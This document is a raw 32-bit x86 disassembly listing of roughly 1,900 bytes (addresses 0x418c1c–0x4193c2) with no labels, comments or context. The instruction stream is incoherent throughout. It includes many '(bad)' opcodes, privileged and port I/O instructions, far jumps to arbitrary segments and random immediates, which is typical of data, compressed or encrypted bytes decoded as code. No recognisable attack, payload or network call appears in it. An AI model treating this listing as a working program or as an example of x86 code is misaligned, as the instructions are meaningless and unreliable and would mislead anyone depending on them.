  418c1c:	aad    0xf4
  418c1e:	les    ebx,FWORD PTR [ebx+edi*1+0x2f3dd064]
  418c25:	jbe    0x418bd1
  418c27:	dec    ebp
  418c28:	xlat   BYTE PTR ds:[ebx]
  418c29:	push   ds
  418c2a:	test   eax,0x16ee6460
  418c2f:	adc    edi,DWORD PTR [edi]
  418c31:	test   BYTE PTR [esp+ebx*1],al
  418c34:	mov    ecx,0x18a45183
  418c39:	and    BYTE PTR [eax+0x3d61b824],0xfb
  418c40:	adc    dl,ch
  418c42:	repz shr DWORD PTR [edi+0x287b70dd],1
  418c49:	inc    ebx
  418c4a:	enter  0xb300,0x73
  418c4e:	inc    ecx
  418c4f:	jmp    0x8cd9:0xe28bca0e
  418c56:	sub    al,0xfc
  418c58:	jg     0x418ccd
  418c5a:	into   
  418c5b:	das    
  418c5c:	seta   BYTE PTR [eax+0x4786ea3a]
  418c63:	call   0x1875:0x4279362
  418c6a:	iret   
  418c6b:	xor    ebx,DWORD PTR [esi-0x70]
  418c6e:	jae    0x418ce2
  418c70:	loope  0x418cc9
  418c72:	stos   DWORD PTR es:[edi],eax
  418c73:	call   0xa689ec2f
  418c78:	aaa    
  418c79:	adc    BYTE PTR [ebx],ch
  418c7b:	mov    edi,0x5ac587b7
  418c80:	fcmovu st,st(4)
  418c82:	pop    ecx
  418c83:	cli    
  418c84:	sub    al,0x53
  418c86:	add    BYTE PTR [ecx],cl
  418c88:	push   esi
  418c89:	xor    eax,0x158602b6
  418c8e:	jecxz  0x418c16
  418c90:	xor    eax,0x7730d338
  418c95:	loop   0x418c95
  418c97:	xor    al,0xd3
  418c99:	pop    ebp
  418c9a:	push   edx
  418c9b:	loope  0x418c60
  418c9d:	loop   0x418cf8
  418c9f:	add    bl,0xe6
  418ca2:	mov    al,ds:0xef508a3e
  418ca7:	mov    dh,0xb
  418ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418caa:	or     BYTE PTR [ebx],ch
  418cac:	call   0x91e6682d
  418cb1:	adc    ebx,DWORD PTR [edi+edi*1]
  418cb4:	and    BYTE PTR [esi+0x6d],bh
  418cb7:	jae    0x418cbd
  418cb9:	adc    al,0x79
  418cbb:	pmuludq mm3,QWORD PTR [edi]
  418cbe:	mov    WORD PTR ds:0x888dc5df,ds
  418cc4:	sbb    DWORD PTR [ebx],esp
  418cc6:	fs mov bl,0x9d
  418cc9:	mov    ecx,0x95790e86
  418cce:	and    BYTE PTR [ecx+0x4e],dl
  418cd1:	sbb    eax,DWORD PTR [ebx]
  418cd3:	cli    
  418cd4:	inc    ebx
  418cd5:	js     0x418d37
  418cd7:	pop    edx
  418cd8:	cmp    BYTE PTR [ebx],0x8c
  418cdb:	scas   al,BYTE PTR es:[di]
  418cdd:	cmp    dh,bh
  418cdf:	dec    edx
  418ce0:	mul    DWORD PTR [eax-0x2b064503]
  418ce6:	mov    ch,0x82
  418ce8:	jecxz  0x418c90
  418cea:	sbb    BYTE PTR [ebx],ah
  418cec:	and    eax,0x1a100c04
  418cf1:	pop    esi
  418cf2:	or     eax,0x3e12a563
  418cf7:	jmp    0x418ccd
  418cf9:	test   BYTE PTR [ebp+edx*4-0x52],dl
  418cfd:	fbstp  TBYTE PTR [edx-0x391f4d3a]
  418d03:	(bad)  
  418d04:	fistp  QWORD PTR [esp+eax*4+0x52a8bd1e]
  418d0b:	pop    eax
  418d0c:	int    0x99
  418d0e:	sbb    eax,0x361a1823
  418d13:	out    dx,eax
  418d14:	mul    DWORD PTR [eax]
  418d16:	jge    0x418d68
  418d18:	cmp    ebp,DWORD PTR [edi+0x57a2a81e]
  418d1e:	es pusha 
  418d20:	jne    0x418d11
  418d22:	arpl   si,di
  418d24:	lahf   
  418d25:	pop    ecx
  418d26:	int3   
  418d27:	or     edi,DWORD PTR [ebx+0x63ce12f3]
  418d2d:	daa    
  418d2e:	(bad)  
  418d2f:	scas   eax,DWORD PTR es:[edi]
  418d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d31:	mov    ah,0x9f
  418d33:	push   0x4d0e7c2e
  418d38:	or     al,0x2d
  418d3a:	int3   
  418d3b:	loope  0x418d79
  418d3d:	mov    esi,0x818413fd
  418d42:	aad    0x64
  418d44:	pusha  
  418d45:	fdivr  DWORD PTR [ebp*8+0x22c27397]
  418d4c:	xor    DWORD PTR [ebx-0x8],ecx
  418d4f:	ins    DWORD PTR es:[edi],dx
  418d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d51:	xchg   ecx,eax
  418d52:	sub    al,0x26
  418d54:	cmove  ecx,DWORD PTR [esi+edi*2]
  418d58:	push   ebp
  418d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d5a:	xor    ebp,DWORD PTR [edx]
  418d5c:	jg     0x418cf4
  418d5e:	into   
  418d5f:	pop    eax
  418d60:	lea    eax,[esi+ebp*4-0x28]
  418d64:	xchg   esp,eax
  418d65:	retf   
  418d66:	dec    ebp
  418d67:	(bad)  
  418d68:	jg     0x418d99
  418d6a:	fs (bad) 
  418d6c:	adc    BYTE PTR [ecx],ch
  418d6e:	adc    ebp,DWORD PTR [edx-0x399b3f1e]
  418d74:	xor    ah,dh
  418d76:	push   0x94cbe8ea
  418d7b:	call   0x6c6476ad
  418d80:	fcmove st,st(2)
  418d82:	jmp    0x9cdd:0xa76b355a
  418d89:	push   ebp
  418d8a:	dec    eax
  418d8b:	outs   dx,DWORD PTR ds:[esi]
  418d8c:	push   0x60a092d7
  418d91:	sub    esi,DWORD PTR [edi+0x453ecdd4]
  418d97:	sbb    ax,0x6fc9
  418d9b:	inc    edx
  418d9c:	mov    bh,0xb1
  418d9e:	pop    ebx
  418d9f:	nop
  418da0:	push   ss
  418da1:	das    
  418da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da3:	sbb    eax,0x76668e39
  418da8:	fcmovu st,st(4)
  418daa:	lock adc eax,0xe7cd495d
  418db0:	jnp    0x418d98
  418db2:	jl     0x418e1c
  418db4:	ds jp  0x418e34
  418db7:	cwde   
  418db8:	xor    esp,DWORD PTR [ecx]
  418dba:	pusha  
  418dbb:	mov    ebp,0x95ad1db6
  418dc0:	add    BYTE PTR [esi],bl
  418dc2:	inc    edx
  418dc3:	push   cs
  418dc4:	fstp   DWORD PTR [esi+0x5c]
  418dc7:	xor    DWORD PTR [ebx-0x34],edi
  418dca:	add    eax,0x5d561d9a
  418dcf:	xchg   ebx,eax
  418dd0:	xchg   eax,edi
  418dd2:	test   al,0x8b
  418dd4:	ss xchg ebx,eax
  418dd6:	sbb    ebx,DWORD PTR [eax+0x6c]
  418dd9:	pop    ecx
  418dda:	jg     0x418e30
  418ddc:	jne    0x418da2
  418dde:	popa   
  418ddf:	and    edx,edx
  418de1:	(bad)  
  418de2:	xor    eax,0x947329ec
  418de7:	addr16 add al,0x8a
  418dea:	cmp    ch,BYTE PTR [ebx]
  418dec:	or     edx,DWORD PTR [esi-0x3d6ad43b]
  418df2:	sbb    esi,DWORD PTR [edi+0x63]
  418df5:	inc    esp
  418df6:	dec    esi
  418df7:	jge    0x418e55
  418df9:	test   DWORD PTR ds:0xa269f9e1,ebp
  418dff:	fisub  DWORD PTR ds:0x66831a64
  418e05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e06:	icebp  
  418e07:	pop    esi
  418e08:	ds (bad) 
  418e0a:	adc    ebx,eax
  418e0c:	mov    bl,0x7a
  418e0e:	jno    0x418e32
  418e10:	fsubr  DWORD PTR [eax]
  418e12:	inc    esi
  418e13:	and    esp,DWORD PTR [edx]
  418e15:	gs pop eax
  418e17:	inc    edi
  418e18:	sbb    BYTE PTR [eax-0x60],ah
  418e1b:	adc    al,0xd6
  418e1d:	sar    DWORD PTR [eax+esi*8],cl
  418e20:	mov    esp,0xfa55a0e7
  418e25:	lods   eax,DWORD PTR ds:[esi]
  418e26:	or     ecx,esi
  418e28:	sbb    eax,0x6aad8744
  418e2d:	inc    ecx
  418e2e:	aas    
  418e2f:	lahf   
  418e30:	imul   esp,esp,0xffffff9b
  418e33:	dec    ebp
  418e34:	xchg   edi,eax
  418e35:	lods   eax,DWORD PTR ds:[esi]
  418e36:	out    dx,al
  418e37:	jl     0x418e55
  418e39:	jle    0x418e03
  418e3b:	popa   
  418e3c:	or     ebp,esi
  418e3e:	(bad)  
  418e40:	pop    edx
  418e41:	and    DWORD PTR [edi+eiz*8+0x785cc630],esi
  418e48:	rol    DWORD PTR [ecx-0x36ee3be5],1
  418e4e:	pop    eax
  418e4f:	mov    bh,al
  418e51:	aas    
  418e52:	imul   esp,DWORD PTR [esi],0xffffffc7
  418e55:	mov    bh,0x2e
  418e57:	test   al,0x7f
  418e59:	dec    ecx
  418e5a:	xor    bh,dh
  418e5c:	inc    esi
  418e5d:	mov    ebx,edx
  418e5f:	ret    0x4aa2
  418e62:	shl    BYTE PTR [edx],0xda
  418e65:	jb     0x418e23
  418e67:	or     BYTE PTR [esp+eiz*2],cl
  418e6a:	lea    esp,[edi-0x10]
  418e6d:	sub    dl,cl
  418e6f:	sub    ecx,DWORD PTR [esi+0x36]
  418e72:	mov    ecx,0xf9ed127f
  418e77:	ficom  WORD PTR [ecx-0x6a]
  418e7a:	lock adc eax,0xfe4ce6f5
  418e80:	(bad)  
  418e81:	jbe    0x418efc
  418e83:	test   BYTE PTR [ebx+0x3d854830],bh
  418e89:	mov    edi,?
  418e8b:	loopne 0x418e41
  418e8d:	sub    BYTE PTR [esi+edx*2+0x2a],0x2f
  418e92:	push   es
  418e93:	das    
  418e94:	ss push esi
  418e96:	xor    dl,bl
  418e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e99:	dec    edx
  418e9a:	mov    al,ds:0x22407343
  418ea0:	or     ebx,DWORD PTR [eax+0x50208b00]
  418ea6:	pop    esp
  418ea7:	(bad)  
  418ea8:	mov    al,0xbd
  418eaa:	jne    0x418e7f
  418eac:	cmc    
  418ead:	loop   0x418e30
  418eaf:	scas   eax,DWORD PTR es:[edi]
  418eb0:	push   ecx
  418eb1:	inc    ebx
  418eb2:	pop    ds
  418eb3:	lods   al,BYTE PTR ds:[esi]
  418eb4:	fst    st(0)
  418eb6:	inc    ecx
  418eb7:	mov    ecx,0xe07ffaf4
  418ebc:	leave  
  418ebd:	enter  0x75f1,0x1b
  418ec1:	rcl    BYTE PTR [ebx-0x42],1
  418ec4:	push   esi
  418ec5:	nop
  418ec6:	push   ss
  418ec7:	sti    
  418ec8:	aam    0x55
  418eca:	push   eax
  418ecb:	inc    edx
  418ecc:	int3   
  418ecd:	inc    esi
  418ece:	mov    ebx,0x1883b4c6
  418ed3:	aam    0x11
  418ed5:	mov    fs,WORD PTR [ecx+ebp*8]
  418ed8:	mov    dh,0xda
  418eda:	jb     0x418f28
  418edc:	scas   eax,DWORD PTR es:[edi]
  418edd:	push   ecx
  418ede:	scas   eax,DWORD PTR es:[edi]
  418edf:	push   ebx
  418ee0:	sti    
  418ee1:	inc    ecx
  418ee2:	add    DWORD PTR [eax+ebx*8],esp
  418ee5:	fwait
  418ee6:	popf   
  418ee7:	(bad)  
  418ee8:	pop    ebp
  418ee9:	mov    bh,0x33
  418eeb:	stc    
  418eec:	jb     0x418e98
  418eee:	lea    ebp,[edx+0x27]
  418ef1:	daa    
  418ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ef3:	std    
  418ef4:	add    al,cl
  418ef6:	xor    edi,DWORD PTR ds:0x7bd3bc16
  418efc:	jnp    0x418f3f
  418efe:	jo     0x418f0b
  418f00:	sub    al,bh
  418f02:	dec    ebx
  418f03:	aas    
  418f04:	inc    DWORD PTR [edx]
  418f06:	lods   al,BYTE PTR ds:[esi]
  418f07:	or     DWORD PTR [eiz*4-0x13810f37],edi
  418f0e:	or     ebx,DWORD PTR [edx+0x646301ed]
  418f14:	inc    edx
  418f15:	icebp  
  418f16:	inc    ecx
  418f17:	jecxz  0x418f24
  418f19:	mov    cl,0x7a
  418f1b:	fimul  WORD PTR [edi+ebp*8]
  418f1e:	in     al,0xf7
  418f20:	xchg   ebp,eax
  418f21:	xchg   esp,eax
  418f22:	or     esi,DWORD PTR [eax]
  418f24:	pop    esp
  418f25:	mov    ah,0x70
  418f27:	sub    al,0xf6
  418f29:	pop    edx
  418f2a:	rcr    BYTE PTR [edi-0x50744482],cl
  418f30:	dec    esi
  418f31:	add    eax,0xd08d1145
  418f36:	push   ebp
  418f37:	jmp    0x418ef5
  418f39:	adc    ecx,DWORD PTR [ebx+eiz*1]
  418f3c:	aam    0x69
  418f3e:	stos   BYTE PTR es:[edi],al
  418f3f:	sbb    al,0x6f
  418f41:	sub    DWORD PTR [eax-0x5f],0xbee80dbc
  418f48:	fisttp WORD PTR [eax+0x166673a3]
  418f4e:	sti    
  418f4f:	retf   0xff4e
  418f52:	push   es
  418f53:	sahf   
  418f54:	cmc    
  418f55:	mov    ecx,0x7cb363d1
  418f5a:	xor    DWORD PTR [ebx+0x6c5ed4b8],esi
  418f60:	mov    al,0x1
  418f62:	mov    edx,0x30ad3d7f
  418f67:	daa    
  418f68:	and    bl,ch
  418f6a:	mov    ch,0x3f
  418f6c:	pop    esp
  418f6d:	inc    edi
  418f6e:	push   esi
  418f6f:	mov    ebp,0x99a37a4f
  418f74:	dec    ebp
  418f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f76:	aaa    
  418f77:	jnp    0x418f03
  418f79:	or     eax,0xe342d7f2
  418f7e:	lea    edi,[ebx+ebx*4+0x93e991b]
  418f85:	adc    ebp,DWORD PTR [ecx]
  418f87:	mov    edi,DWORD PTR [ecx]
  418f89:	fs adc eax,0x529c58fb
  418f8f:	int    0x90
  418f91:	sub    edx,edi
  418f93:	dec    eax
  418f94:	clc    
  418f95:	ret    0x84e6
  418f98:	hlt    
  418f99:	aad    0x47
  418f9b:	mov    dl,0xf6
  418f9d:	push   ds
  418f9e:	shr    ch,1
  418fa0:	dec    ebp
  418fa1:	and    al,BYTE PTR [esp-0x6683ef0f]
  418fa8:	popf   
  418fa9:	mov    al,0x6b
  418fab:	xor    ebx,DWORD PTR [edx+0x4103f6b1]
  418fb1:	cwde   
  418fb2:	stos   DWORD PTR es:[edi],eax
  418fb3:	push   ebp
  418fb4:	pop    ds
  418fb5:	mov    cl,0xa2
  418fb7:	pop    ecx
  418fb8:	arpl   WORD PTR [edi-0x17d43104],di
  418fbe:	inc    ecx
  418fbf:	les    edx,FWORD PTR [ebp+0x22]
  418fc2:	enter  0xf9b0,0x55
  418fc6:	fsubr  DWORD PTR [esi-0x5be15079]
  418fcc:	xchg   edx,eax
  418fcd:	xchg   edx,eax
  418fce:	xlat   BYTE PTR ds:[ebx]
  418fcf:	adc    eax,0x8c3bab5d
  418fd4:	lea    edi,[edi]
  418fd6:	neg    DWORD PTR [edx]
  418fd8:	mov    dl,0xd6
  418fda:	mov    ecx,0x5f83815e
  418fdf:	hlt    
  418fe0:	rol    DWORD PTR [ebx],0xba
  418fe3:	lahf   
  418fe4:	mov    ah,0xff
  418fe6:	sub    al,0x60
  418fe8:	or     BYTE PTR [esi+esi*2-0x5e517eeb],al
  418fef:	jnp    0x419061
  418ff1:	and    bl,BYTE PTR [eax]
  418ff3:	xchg   BYTE PTR [edi-0x6a],ch
  418ff6:	cli    
  418ff7:	push   ss
  418ff8:	retf   
  418ff9:	jmp    0x419039
  418ffb:	dec    esi
  418ffc:	jg     0x418fd0
  418ffe:	mov    esi,0x76c58b06
  419003:	inc    eax
  419004:	cmc    
  419005:	adc    al,BYTE PTR [ebx+0xa]
  419008:	sub    al,0xe8
  41900a:	adc    esi,DWORD PTR [esi+eiz*2]
  41900d:	fisubr WORD PTR [edi+0x7783ebe3]
  419013:	xor    BYTE PTR [edx],bl
  419015:	jecxz  0x418fad
  419017:	push   ecx
  419018:	sbb    ebx,edi
  41901a:	sti    
  41901b:	mov    ah,0x8c
  41901d:	int    0x84
  41901f:	jmp    0x419015
  419021:	adc    al,BYTE PTR ds:[ebx-0x543ce041]
  419028:	(bad)  
  419029:	push   0xda57252c
  41902e:	out    0x3b,eax
  419030:	loop   0x419042
  419032:	push   ebp
  419033:	or     eax,0xb442e9b6
  419038:	mov    eax,0xd30fefef
  41903d:	popf   
  41903e:	into   
  41903f:	push   edx
  419040:	sbb    BYTE PTR [edx+eax*2+0x3c4fca45],bh
  419047:	inc    eax
  419048:	push   esp
  419049:	mov    al,ds:0xc6dd396a
  41904e:	jb     0x418fd0
  419050:	inc    esp
  419051:	add    eax,0x9ce68116
  419056:	sbb    al,0x95
  419058:	dec    edi
  419059:	xor    al,0x19
  41905b:	dec    esi
  41905c:	aam    0xb
  41905e:	inc    eax
  41905f:	and    eax,0x4f95bd39
  419064:	call   0x1b3cdf87
  419069:	and    DWORD PTR [ecx],edx
  41906b:	repnz dec ecx
  41906d:	push   edx
  41906e:	fld    TBYTE PTR [esi]
  419070:	test   DWORD PTR [edi-0x69],ecx
  419073:	push   edi
  419074:	ins    BYTE PTR es:[edi],dx
  419075:	push   esi
  419076:	and    DWORD PTR [ebp+0x74f549d5],ebp
  41907c:	test   BYTE PTR [eax-0x64257bd4],al
  419082:	loopne 0x419015
  419084:	mov    eax,ds:0xf06b171a
  419089:	(bad)  
  41908b:	cli    
  41908c:	mov    WORD PTR ds:0xaeb3f1af,cs
  419092:	ins    DWORD PTR es:[edi],dx
  419093:	jae    0x4190d5
  419095:	add    DWORD PTR [ebp+0x248b54bb],0xb44e879
  41909f:	fld    DWORD PTR [ecx+0x7e]
  4190a2:	cwde   
  4190a3:	daa    
  4190a4:	fcomp  DWORD PTR [ebp+0x17]
  4190a7:	add    ebx,DWORD PTR [ebx+edi*4+0x10]
  4190ab:	pop    edx
  4190ac:	cmp    edi,ebp
  4190ae:	jbe    0x419030
  4190b0:	dec    ebp
  4190b1:	rol    ebp,cl
  4190b3:	push   eax
  4190b4:	ret    0xbd0b
  4190b7:	adc    esp,esp
  4190b9:	outs   dx,DWORD PTR ds:[esi]
  4190ba:	or     edx,DWORD PTR [ebx]
  4190bc:	ret    0xb475
  4190bf:	sahf   
  4190c0:	push   ecx
  4190c1:	push   esp
  4190c2:	xchg   DWORD PTR [ebp+0x5e],edx
  4190c5:	outs   dx,BYTE PTR ds:[esi]
  4190c6:	rol    ecx,cl
  4190c8:	rcl    DWORD PTR [ebx],1
  4190ca:	test   al,0x5f
  4190cc:	dec    ebx
  4190cd:	aam    0x78
  4190cf:	inc    ebx
  4190d0:	xlat   BYTE PTR ds:[ebx]
  4190d1:	test   ecx,ebp
  4190d3:	cwde   
  4190d4:	iret   
  4190d5:	xor    BYTE PTR [ecx+eiz*8+0x1f498b07],al
  4190dc:	or     ebx,DWORD PTR [ebx-0x70]
  4190df:	dec    ecx
  4190e0:	loopne 0x41913a
  4190e2:	aad    0x2
  4190e4:	xor    BYTE PTR [edx],bh
  4190e6:	mov    ebx,0xe84334b9
  4190eb:	mov    edx,0xabd7d58f
  4190f0:	int3   
  4190f1:	jg     0x41915d
  4190f3:	js     0x4190cd
  4190f5:	adc    eax,0x15d50652
  4190fa:	dec    ebp
  4190fb:	ret    0x260d
  4190fe:	daa    
  4190ff:	out    0xbf,al
  419101:	cmp    eax,0xd62bb14
  419106:	pop    edx
  419107:	xchg   ebp,eax
  419108:	mov    al,0x14
  41910a:	xor    BYTE PTR [ecx+0x1a7cc591],bl
  419110:	das    
  419111:	jg     0x419132
  419113:	jb     0x4190f0
  419115:	pushf  
  419116:	gs mov eax,es
  419119:	repnz gs in al,0x14
  41911d:	xor    eax,0x7013f21f
  419122:	in     eax,dx
  419123:	inc    ecx
  419124:	dec    edi
  419125:	xchg   edi,eax
  419126:	jg     0x4190c6
  419128:	cmp    DWORD PTR [edi],ebx
  41912a:	jle    0x419167
  41912c:	push   es
  41912d:	xor    BYTE PTR [edx+0x1412811d],al
  419133:	cwde   
  419134:	mov    dh,0xe8
  419136:	(bad)  
  419137:	sti    
  419138:	js     0x4190e9
  41913a:	sar    dl,0x1e
  41913d:	fwait
  41913e:	jne    0x419148
  419140:	cmp    DWORD PTR [edx+esi*8-0x32],eax
  419144:	sub    al,0x99
  419146:	fnstenv [edi-0xe7be9f2]
  41914c:	pop    ecx
  41914d:	add    eax,0x9e83df4a
  419152:	shr    DWORD PTR [esi+eax*1+0x38],1
  419156:	push   cs
  419157:	mov    eax,ds:0xecf44fc3
  41915c:	sub    BYTE PTR [ebp-0x18f0b5cb],ch
  419162:	jbe    0x419100
  419164:	nop
  419165:	xchg   BYTE PTR [ecx-0x2f],dh
  419168:	hlt    
  419169:	inc    ebx
  41916a:	xchg   esp,eax
  41916b:	leave  
  41916c:	push   edi
  41916d:	daa    
  41916e:	adc    eax,0xaf33d0ce
  419173:	xchg   ecx,eax
  419174:	sub    BYTE PTR [ecx+0x61],ch
  419177:	mov    bh,0x74
  419179:	ins    DWORD PTR es:[di],dx
  41917b:	sub    al,0x7b
  41917d:	fisub  DWORD PTR ds:0xe5e32d3c
  419183:	out    0x38,eax
  419185:	addr16 imul edi,esp,0xffffff97
  419189:	dec    ecx
  41918a:	add    DWORD PTR [ebx+0x5],0x9fed6dc8
  419191:	sti    
  419192:	xor    BYTE PTR [esi-0x5cbe001b],ah
  419198:	fdivr  DWORD PTR [edx]
  41919a:	xchg   edi,eax
  41919b:	add    DWORD PTR [ebx],edi
  41919d:	push   eax
  41919e:	leave  
  41919f:	mov    esi,0x6acc0071
  4191a4:	jne    0x41919d
  4191a6:	and    DWORD PTR [eax],ebx
  4191a8:	mov    bl,0x50
  4191aa:	cmc    
  4191ab:	loopne 0x4191ea
  4191ad:	test   al,0x3b
  4191af:	call   FWORD PTR [edx+0x7ad8cb7a]
  4191b5:	sub    ah,BYTE PTR [edx-0x1181d222]
  4191bb:	fisubr WORD PTR ds:0xc8872e57
  4191c1:	gs sahf 
  4191c3:	adc    BYTE PTR [esi-0x1e],bl
  4191c6:	inc    eax
  4191c7:	inc    ecx
  4191c8:	fcomi  st,st(5)
  4191ca:	mov    edi,0xdc86ef75
  4191cf:	push   ebx
  4191d0:	loop   0x4191a1
  4191d2:	fdivr  QWORD PTR [ecx]
  4191d4:	(bad)  
  4191d5:	rol    eax,cl
  4191d7:	test   ah,dh
  4191d9:	jno    0x419221
  4191db:	lods   al,BYTE PTR ds:[esi]
  4191dc:	mov    esi,0x605d0c0f
  4191e1:	sub    DWORD PTR [ebp+0x1a],0x31
  4191e5:	xor    esi,DWORD PTR [esi]
  4191e7:	loop   0x4191aa
  4191e9:	(bad)  
  4191ea:	lods   al,BYTE PTR ds:[esi]
  4191eb:	bound  ebx,QWORD PTR [edx]
  4191ed:	mov    DWORD PTR [ebx-0x36d21934],ebx
  4191f3:	addr16 imul ebx,esp,0xfc1c3f7b
  4191fa:	xchg   ecx,eax
  4191fb:	int3   
  4191fc:	pop    edx
  4191fd:	add    DWORD PTR [ebp+0x48499151],eax
  419203:	sub    DWORD PTR [ebp+0x628e116a],esp
  419209:	jge    0x4191e4
  41920b:	jecxz  0x4191a5
  41920d:	or     edx,0xfffffff9
  419210:	dec    ebx
  419211:	xor    BYTE PTR [edi+0x3b3e4972],bh
  419217:	loopne 0x41924d
  419219:	gs scas al,BYTE PTR es:[edi]
  41921b:	ins    BYTE PTR es:[edi],dx
  41921c:	adc    al,BYTE PTR ds:0x8bb847
  419222:	lahf   
  419223:	(bad)  
  419224:	in     al,0xe0
  419226:	shr    BYTE PTR [ebx],1
  419228:	adc    eax,0x9f76a8d6
  41922d:	lea    edx,[edx+ebx*2]
  419230:	lea    ebp,[edi+ebx*8-0x42]
  419234:	inc    edi
  419235:	mov    cl,0x18
  419237:	imul   DWORD PTR [esi-0x614289e6]
  41923d:	mov    eax,0x3fe433c1
  419242:	in     al,0x18
  419244:	sbb    DWORD PTR ds:0xafd5ff9a,eax
  41924a:	stos   DWORD PTR es:[edi],eax
  41924b:	jp     0x41924f
  41924d:	hlt    
  41924e:	push   esp
  41924f:	add    DWORD PTR [ecx+0x13],edi
  419252:	or     esp,edx
  419254:	xchg   DWORD PTR [ebx+0x11ae7ccf],ebx
  41925a:	call   0xb5bc571b
  41925f:	fstp   TBYTE PTR [ebx-0x1e9a1e72]
  419265:	add    DWORD PTR [ecx+0x4256364f],eax
  41926b:	mov    WORD PTR [di-0x78],cs
  41926f:	ss jge 0x419226
  419272:	push   cs
  419273:	inc    ebx
  419274:	(bad)  
  419275:	sbb    eax,0x5dbb0cb6
  41927a:	sbb    edi,0x66
  41927d:	mov    ch,0x21
  41927f:	mov    eax,DWORD PTR [eax-0x11]
  419282:	pop    edi
  419283:	pop    ebp
  419284:	fidiv  WORD PTR [esi-0x59491b34]
  41928a:	test   al,0xbc
  41928c:	(bad)  
  41928d:	jo     0x4192ff
  41928f:	(bad)  
  419290:	cmp    al,ch
  419292:	outs   dx,DWORD PTR ds:[esi]
  419293:	into   
  419294:	jle    0x4192e3
  419296:	ja     0x4192d7
  419298:	inc    esp
  419299:	cmc    
  41929a:	arpl   WORD PTR [eax-0x26902846],bp
  4192a0:	js     0x4192fa
  4192a2:	inc    BYTE PTR [esi+0x34]
  4192a5:	push   ss
  4192a6:	mov    ds,edi
  4192a8:	cdq    
  4192a9:	pop    eax
  4192aa:	mov    ds:0x7db0c8d0,al
  4192af:	out    dx,al
  4192b0:	jne    0x4192f3
  4192b2:	xor    DWORD PTR [esi],ebp
  4192b4:	mov    ebx,0x9089cd9d
  4192b9:	xor    DWORD PTR [ebx-0x6],0x48
  4192bd:	scas   eax,DWORD PTR es:[edi]
  4192be:	shl    dl,1
  4192c0:	inc    ebp
  4192c1:	mov    ecx,0x224c9c38
  4192c6:	jmp    0x87f7:0xe39d3b
  4192cd:	sbb    DWORD PTR [eax-0x3],0xffffffe5
  4192d1:	inc    edi
  4192d2:	mov    dl,0x4c
  4192d4:	sbb    bh,BYTE PTR [ebp+0x791c0f65]
  4192da:	cmp    BYTE PTR [edi-0x73],bh
  4192dd:	cmp    dl,dh
  4192df:	pop    ss
  4192e0:	in     eax,dx
  4192e1:	dec    edx
  4192e2:	mov    dl,bl
  4192e4:	pop    ds
  4192e5:	imul   edx,esp,0xffffffd9
  4192e8:	icebp  
  4192e9:	sbb    ch,BYTE PTR [eax+ebx*2+0x1b]
  4192ed:	(bad)  
  4192ee:	pop    ds
  4192ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f0:	enter  0x2025,0x32
  4192f4:	push   ecx
  4192f5:	xchg   esi,eax
  4192f6:	pop    ebp
  4192f7:	pop    ebx
  4192f8:	sbb    ebp,DWORD PTR [edi-0x74]
  4192fb:	ds scas al,BYTE PTR es:[edi]
  4192fd:	mov    ch,0x49
  4192ff:	in     eax,0x73
  419301:	retf   
  419302:	test   eax,0x6d106d94
  419307:	mov    edx,0x4df39bd5
  41930c:	add    eax,0x9a98c1c2
  419311:	stos   DWORD PTR es:[edi],eax
  419312:	push   0x4f27cbc9
  419317:	dec    edi
  419318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419319:	sub    al,0xbe
  41931b:	mov    ds:0x5f014607,al
  419320:	stos   BYTE PTR es:[edi],al
  419321:	pop    eax
  419322:	(bad)  
  419324:	ja     0x4192f6
  419326:	scas   al,BYTE PTR es:[edi]
  419327:	xor    eax,0x3bb0f990
  41932c:	sub    al,0x57
  41932e:	(bad)  
  41932f:	mov    al,0x1c
  419331:	popf   
  419332:	shl    BYTE PTR [ebx+0x1e00c056],cl
  419338:	iret   
  419339:	inc    ebx
  41933a:	mov    ebx,0x5ecffa56
  41933f:	fcom   QWORD PTR [ecx+0x14]
  419342:	scas   al,BYTE PTR es:[edi]
  419343:	in     al,0xaa
  419345:	lods   eax,DWORD PTR ds:[esi]
  419346:	push   ebp
  419347:	lahf   
  419348:	sub    DWORD PTR [esi+0x28c1e2b],eax
  41934e:	(bad)  
  41934f:	out    0x6c,eax
  419351:	push   eax
  419352:	enter  0xc967,0x43
  419356:	and    BYTE PTR [ecx+0x4ab86486],al
  41935c:	jb     0x4192f2
  41935e:	inc    edi
  41935f:	mov    edi,0x84b37c86
  419364:	xchg   ecx,eax
  419365:	sub    DWORD PTR [bx-0x57],ecx
  419369:	jae    0x4193e2
  41936b:	adc    al,0xf0
  41936d:	push   esp
  41936e:	mov    WORD PTR [esi],cs
  419370:	clc    
  419371:	or     bh,BYTE PTR [edx+0x55]
  419374:	and    BYTE PTR [ebx-0x2c7d157],0xaf
  41937b:	leave  
  41937c:	fwait
  41937d:	out    0x93,eax
  41937f:	mov    eax,ds:0x5f36026f
  419384:	fnsave [ebx]
  419386:	mov    ebp,0xc5cdf033
  41938c:	inc    edx
  41938d:	rcl    BYTE PTR [ecx-0x577b8e0d],0x1f
  419394:	adc    al,0xe3
  419396:	cmp    bh,BYTE PTR [edi+0x7f]
  419399:	cmp    eax,DWORD PTR [edi-0x77]
  41939c:	test   DWORD PTR [ecx],edi
  41939e:	sub    ecx,esi
  4193a0:	inc    edx
  4193a1:	(bad)  
  4193a2:	mov    ch,0xb2
  4193a4:	loop   0x4193f9
  4193a6:	outs   dx,BYTE PTR ds:[esi]
  4193a7:	cmc    
  4193a8:	js     0x419399
  4193aa:	(bad)  
  4193ab:	push   ds
  4193ac:	inc    ecx
  4193ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ae:	cmp    eax,0x49ced6e3
  4193b3:	test   al,0x6a
  4193b5:	push   edi
  4193b6:	outs   dx,DWORD PTR ds:[esi]
  4193b7:	dec    ecx
  4193b8:	rcl    cl,1
  4193ba:	push   esi
  4193bb:	ror    DWORD PTR [eax+0x58a1521e],0x5e
  4193c2:	push   0x9ce1239c
